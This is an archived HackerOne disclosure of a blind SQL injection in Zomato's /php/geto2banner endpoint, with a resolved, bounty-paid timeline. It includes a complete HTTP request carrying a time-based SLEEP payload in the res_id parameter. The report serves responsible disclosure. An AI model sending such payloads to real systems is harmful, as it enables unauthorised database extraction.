---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
  - stack/php
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2020-08-10
submitted: 2020-04-04T14:15:36.412Z
bounty_usd: 2000
votes: 68
cve: []
program: "[[programs/eternal|Eternal]]"
reporter: "zzzhacker13"
source: "https://hackerone.com/reports/838855"
title: "[www.zomato.com] Blind SQL Injection in /php/geto2banner"
---
# [www.zomato.com] Blind SQL Injection in /php/geto2banner

> **Severity:** Critical | **Bounty:** 2,000 USD | **Votes:** 68 | **Program:** Eternal | **Disclosed:** 2020-08-10

- Report: [https://hackerone.com/reports/838855](https://hackerone.com/reports/838855)
- CWE: SQL Injection
- Submitted: 2020-04-04T14:15:36.412Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Hi Team!

Our team discovered a ``Blind SQL Injection`` by Abusing LocalParams (`res_id`) in `/php/geto2banner`
**We are working to create a full PDF Report as an WriteUp ;)**

## Here is a Temporal Exploit based on the Vulnerable request:

```
POST /php/geto2banner HTTP/1.1
Host: www.zomato.com
Connection: close
Content-Length: 73
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en

res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
```

Thank you so much!!

- As you can see in the request - we are able to **Exploit** it to **extract data from your DB**!

## Impact

## Full database access holding private user information.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2020-04-04** @biryani-is-lob: Hi @zzzhacker13, 

Thanks for the submission, we are able to reproduce the issue you described. 

@ehsahil-zomato
- **2020-04-04** @zzzhacker13: Hi @ehsahil-zomato ;)

**Great! Thank you very much xD**
Very professional, well done!!
- **2020-04-04** @zzzhacker13: @ehsahil-zomato

**Hi Sahil,**
**You forgot to return the signal requirements.**
- **2020-04-04** @zzzhacker13: Hi @ehsahil-zomato ;)

## I can confirm that the Vulnerability has been fixed `200 OK`, well done!
- **2020-04-05** @zzzhacker13: Hi mate @ehsahil-zomato ;)

**Here is a Full PDF report with all the details (including Exploit code):**

█████

## Enjoy, Thank you xD
- **2020-04-05** @zzzhacker13: Hi @ehsahil-zomato ;)
## Any Update\Bounty\Resolved?
- **Bounty Awarded**
- **2020-04-06** @zzzhacker13: ## Thank you very much guys, you are awesome!!
@ehsahil-zomato @zomato
- **Report Resolved**
- **2020-04-06** @zzzhacker13: ## Hi team! @prateek_0490 @ehsahil-zomato @zomato xD

**Just wanna say:**
**After being in so much Bug Bounty programs, like Microsoft, Facebook, Google, etc ..**
**I must admit that the Best Bug bounty program ever is Zomato, Well done guys!**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
